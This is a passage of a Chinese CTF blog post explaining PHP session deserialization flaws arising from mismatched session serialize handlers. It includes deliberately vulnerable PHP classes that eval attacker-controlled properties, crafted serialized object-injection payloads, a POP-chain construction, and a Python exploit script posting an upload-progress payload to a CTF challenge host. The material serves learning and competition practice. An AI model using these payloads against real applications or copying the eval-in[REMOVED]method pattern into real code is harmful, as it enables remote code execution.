+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>SESSION文件的内容是<code>names:6:&quot;spoock&quot;;</code> 。由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p>
+<p><strong>序列化简单利用</strong></p>
+<?php
+
+class syclover{
+
+ var $func=""; function __construct() {  $this->func = "phpinfo()";
+
+ }
+
+ function __wakeup(){
+
+  eval($this->func);
+
+ }
+
+}
+
+unserialize($_GET['a']);
+
+?>
+
+<p>在11行对传入的参数进行了序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行<code>eval()</code>方法。我们访问<code>localhost/test.php?a=O:8:&quot;syclover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code>。</p>
+<p>得到的反序列化内容是</p>
+<p>object(syclover)[1]</p>
+<p> public ‘func’ &#x3D;&gt; string ‘echo “spoock”;’ (length&#x3D;14)</p>
+<p><strong>PHP Session中的序列化危害</strong></p>
+<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。</p>
+<p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
+<p>$_SESSION<code>[</code>‘ryat’<code>] = </code>‘|O:11:”PeopleClass”:0:{}’&#96;&#96;;</p>
+<p>上述的$_SESSION的数据使用php_serialize，那么最后的存储的内容就是<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</code>。</p>
+<p>但是我们在进行读取的时候，选择的是php，那么最后读取的内容是:</p>
+<p>array<code> </code>(size&#x3D;1)<code> </code>‘a:1:{s:6:”spoock”;s:24:”‘<code> </code>&#x3D;&gt; <code> </code>object(__PHP_Incomplete_Class)[1]<code> </code>public<code> </code>‘__PHP_Incomplete_Class_Name’<code> </code>&#x3D;&gt; string &#96;&#96;’PeopleClass’<code> </code>(length&#x3D;11)</p>
+<p>这是因为当使用php引擎的时候，<strong>php引擎会以|作为作为key和value的分隔符</strong>，那么就会将<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。 这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
+<p><strong>实际利用</strong></p>
+<p>存在s1.php和us2.php，2个文件所使用的SESSION的引擎（session.serialize_handler）不一样，就形成了一个漏洞、</p>
+<p>s1.php，使用php_serialize来处理session</p>
+<?php ini_set`(`'session.serialize_handler','php_serialize'`);`session_start();
+
+$$_SESSION``[``"spoock"``]=`$$_GET`[`"a"``];
+
+**us2.php,使用php来处理session**
+
+ini_set`(`'session.serialize_handler'`,'php'`);
+
+session_start();
+
+class` `lemon {
+
+​    var` `$hi``;`     function` `__construct(){      $this`->hi = `'phpinfo();';`           }``          function` `__destruct() {         `eval`(`$this`->hi);         ` ``}`       `}
+
+**当访问s1.php时，提交如下的数据：**
+
+localhost/s1.php?a=|O:5:`"lemon"`:1:{s:2:`"hi"`;s:14:`"echo "`spoock`";"`;}
+
+此时传入的数据会按照php_serialize来进行序列化。
+
+此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的`eval()`方法。
+
+例题
+
+# **CTFSHOW 新生杯**
+
+### **剪刀石头布**
+
+考查[session](https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020)反序列化漏洞。 不同的session处理器会导致[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)漏洞
+
+exp：
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://697e59f6-2b82-43b9-806d-25fa3965a86b.challenge.ctf.show/&quot;</span><br><span class="line">sess=&quot;yu22x&quot;</span><br><span class="line">data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;|O:4:&quot;Game&quot;:1:&#123;s:3:&quot;log&quot;;s:22:&quot;/var/www/html/flag.php&quot;;&#125;&#x27;&#125;</span><br><span class="line">files=&#123;&#x27;file&#x27;:&#x27;1&#x27;&#125;</span><br><span class="line">r = requests.post(url,data=data,files=files,cookies=&#123;&#x27;PHPSESSID&#x27;:&#x27;yu22x&#x27;&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+# **安恒杯一道题**
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;varr))&#123;   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;文件&quot;</span>.<span class="variable language_">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+index.php
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">分析可以知道最后肯定是要用execue里的<span class="keyword">eval</span>的</span><br><span class="line"></span><br><span class="line">在本地搭建环境，构造我们需要执行的自定义函数</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>=<span class="string">&#x27;echo &quot;spoock&quot;;&#x27;</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">foo3</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="keyword">new</span> <span class="title function_ invoke__">foo2</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+在foo1中的构造函数中定义$varr的值为foo2的实例，在foo2中定义$obj为foo3的实例，在foo3中定义$varr的值为echo "spoock"。最终得到的序列话的值是
+
+$$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo "spoock";";}}}$$
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Gu0f3n.github.io">Gu0f3n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://gu0f3n.github.io/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/">https://gu0f3n.github.io/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Gu0f3n.github.io" target="_blank">Gu0f3n'blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ciscn2024/">ciscn2024</a></div><div class="post_share"><div class="social-share" data-image="https://picture.gptkong.com/20240718/1649f851be04d94de2a13e226b52920db0.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/07/18/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%AE%9E%E9%AA%8C/" title="反弹shell的实验"><img class="cover" src="https://img.picui.cn/free/2024/07/18/6698bb0478695.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">反弹shell的实验</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Gu0f3n</div><div class="author-info__description">石匠敲击石头的101次</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Gu0f3n?tab=repositories" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://weibo.com/u/3833024804" target="_blank" title="Email"><i class="fa-brands fa-microblog" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text">什么是反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">常见的方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number"></span> <span class="toc-text">文件描述符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number"></span> <span class="toc-text">重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.</span> <span class="toc-text">输入重定向实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2024-simple-php"><span class="toc-number"></span> <span class="toc-text">CISCN2024 simple_php</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E7%9A%84session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number"></span> <span class="toc-text">PHP的session反序列化漏洞</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/" title="ciscn2024的一些反思"><img src="https://picture.gptkong.com/20240718/1649f851be04d94de2a13e226b52920db0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ciscn2024的一些反思"/></a><div class="content"><a class="title" href="/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/" title="ciscn2024的一些反思">ciscn2024的一些反思</a><time datetime="2024-07-18T08:45:41.000Z" title="发表于 2024-07-18 16:45:41">2024-07-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/18/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%AE%9E%E9%AA%8C/" title="反弹shell的实验"><img src="https://img.picui.cn/free/2024/07/18/6698bb0478695.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反弹shell的实验"/></a><div class="content"><a class="title" href="/2024/07/18/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%AE%9E%E9%AA%8C/" title="反弹shell的实验">反弹shell的实验</a><time datetime="2024-07-18T01:16:46.000Z" title="发表于 2024-07-18 09:16:46">2024-07-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://picture.gptkong.com/20240718/1649f851be04d94de2a13e226b52920db0.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Gu0f3n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><div class="fb-customerchat" id="fb-customer-chat" attribution="biz_inbox"></div><script>(() => {
+  document.getElementById('fb-root') ? '' : document.body.insertAdjacentHTML('afterend', '<div id="fb-root"></div>')
+
+  window.fbAsyncInit = function() {
+    FB.init({
+      xfbml: true,
+      version: 'v16.0'
+    });
+  };
+
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = 'https://connect.facebook.net/zh_CN/sdk/xfbml.customerchat.js';
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+
+  const isChatBtn = false
+  const isChatHideShow = false
+
+  if (isChatBtn) {
+    window.chatBtnFn = () => {
+      const isShow = document.querySelector('.fb_customer_chat_bounce_in_v2')
+      isShow ? FB.CustomerChat.hide() : FB.CustomerChat.show()
+    }
+  } else if (isChatHideShow) {
+    window.chatBtn = {
+      hide: () => {
+        FB.CustomerChat.hide()
+      },
+      show: () => {
+        FB.CustomerChat.show(false)
+      }
+    }
+  }
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.14.0-b3"></script></div></div></body></html>
